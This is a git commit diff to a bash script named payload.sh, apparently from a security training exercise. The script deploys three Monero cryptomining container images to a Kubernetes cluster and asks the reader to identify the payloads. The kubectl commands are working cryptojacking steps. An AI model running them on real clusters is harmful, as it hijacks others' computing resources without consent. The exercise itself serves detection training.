222a7bfdc94a4d147a44de212bd3986ea43c2d88
tts2k <tranthaison2000@gmail.com>
2023-12-13 12:23:02 +0700

    add screenshots

--- starter/scripts/payload.sh
+++ starter/scripts/payload.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 #start monero_cpu_moneropool
-kubectl run --kubeconfig kube_config_cluster.yml moneropool --image=servethehome/monero_cpu_moneropool:latest --replicas=1
+kubectl create deployment moneropool --image=servethehome/monero_cpu_moneropool:latest --replicas=1
 #start minergate
-kubectl run --kubeconfig kube_config_cluster.yml minergate --image=servethehome/monero_cpu_minergate:latest --replicas=1
+kubectl create deployment minergate --image=servethehome/monero_cpu_minergate:latest --replicas=1
 #start cryptotonight
-kubectl run --kubeconfig kube_config_cluster.yml cryptotonight --image=servethehome/universal_cryptonight:latest --replicas=1
+kubectl create deployment cryptotonight --image=servethehome/universal_cryptonight:latest --replicas=1
 
 echo "Can you identify the payload(s)?"
